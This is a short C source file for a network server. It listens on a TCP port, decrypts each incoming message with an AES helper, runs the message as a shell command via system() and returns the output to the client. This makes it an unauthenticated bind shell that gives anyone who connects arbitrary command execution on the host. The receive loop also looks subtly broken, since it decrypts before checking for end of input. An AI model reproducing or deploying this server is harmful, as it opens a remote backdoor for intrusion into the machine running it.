/**
 * ****************************************************************************
 * * @File: server.c
 * * @Brief: This file contains the server side code.
 * * @Revision History:
 * * 	     OCT-11-2013; Prashant Tripathi; Initial file commit
 * ****************************************************************************
 * */

#include "network.h"
#include "aes.h"


int main() {
	int sock;
	struct sockaddr_in sock_address;
	char buf[MAX_MSG_LENGTH] = {0};
	int optval = 1;

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0)
		errorString("opening socket");

	setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof optval);

	sock_address.sin_family = AF_INET;
	sock_address.sin_addr.s_addr = INADDR_ANY;
	sock_address.sin_port = htons(PORT);
	if(bind(sock, (void*) &sock_address, sizeof(sock_address)))
		errorString("binding tcp socket");
	if(listen(sock, 1) == -1)
		errorString("listen");
	
	struct sockaddr cli_addr;
	socklen_t cli_len = sizeof(cli_addr);
	int new_socket, new_fd, pid;
	FILE* new_stream;
	
	if((new_fd = dup(STDERR_FILENO)) == -1)
		errorString("dup");
	new_stream = fdopen(new_fd, "w");
	setbuf(new_stream, NULL); // sin buffering
	
	DEBUG_MSG("Initializing server...\n");
	while((new_socket = accept(sock, &cli_addr, &cli_len))) {
		DEBUG_MSG("Client connected.\nForking... ");
		/*Parent Process*/
		if((pid = fork()))
			DEBUG_MSG("child pid = %d.\n", pid);
		/*Child Process*/
		else {
			pid = getpid();
			if(new_socket < 0)
				errorString("accept");
			if(dup2(new_socket, STDOUT_FILENO) == -1)
				errorString("dup2");
			while(1) {
				int readc = 0, filled = 0;
				while(1) {
					readc = recv(new_socket, buf+filled, MAX_MSG_LENGTH-filled-1, 0);
					aes_encrypt(buf, false);
					if(!readc) 
						break;
					filled += readc;
					if(buf[filled-1] == '\0')
						break;
				}
				if(!readc) {
					DEBUG_MSG("\t[%d] Client disconnected.\n", pid);
					break;
				}
				DEBUG_MSG("\t[%d] Command received: %s", pid, buf);
				system(buf);
				DEBUG_MSG("\t[%d] Finished executing command.\n", pid);
				send(new_socket, PROMPT_STRING, 3, MSG_NOSIGNAL);
			}
			close(new_socket);
			DEBUG_MSG("\t[%d] Dying.", pid);
			exit(0);
		}
	}
	fclose(new_stream);
	close(sock);
	return 0;
}
